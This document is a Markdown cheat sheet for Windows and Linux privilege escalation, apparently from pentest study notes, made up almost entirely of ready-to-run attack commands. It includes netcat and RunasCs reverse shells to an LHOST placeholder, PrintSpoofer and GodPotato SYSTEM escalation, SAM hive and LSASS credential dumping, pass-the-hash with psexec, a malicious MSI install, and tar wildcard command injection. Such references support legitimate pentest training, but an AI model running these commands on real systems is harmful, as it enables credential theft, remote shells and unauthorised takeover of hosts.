# Privilege escalation quick reference

## Windows triage

```cmd
whoami /all
whoami /priv
net user
net localgroup administrators
systeminfo
schtasks /query /fo LIST /v
```

```powershell
type (Get-PSReadlineOption).HistorySavePath
Get-CimInstance Win32_Service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
```

### SeImpersonate → SYSTEM

```cmd
PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -c "nc.exe LHOST 443 -e cmd"
GodPotato -cmd "cmd /c whoami"
```

### Backup Operators / SeBackup

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
```

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-psexec -hashes :NTHASH Administrator@TARGET
```

### Creds / LSASS

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

### Common service / install wins

```cmd
:: AlwaysInstallElevated (if both HKLM + HKCU = 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i reverse.msi

:: Unquoted service path / weak service binary ACL — fix path or replace binary after enum
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\"
```

```powershell
# Run as another user with found password
.\RunasCs.exe USER PASS cmd.exe -r LHOST:443
```

## Linux triage

```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -lah /etc/cron* /etc/crontab
cat ~/.bash_history
```

### Common wins

```bash
# sudo → GTFOBins
sudo -l

# cron wildcard (tar) — only if root tars attacker-writable dir
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Concepts: [../04-privilege-escalation/windows.md](../04-privilege-escalation/windows.md) · [../04-privilege-escalation/linux.md](../04-privilege-escalation/linux.md)
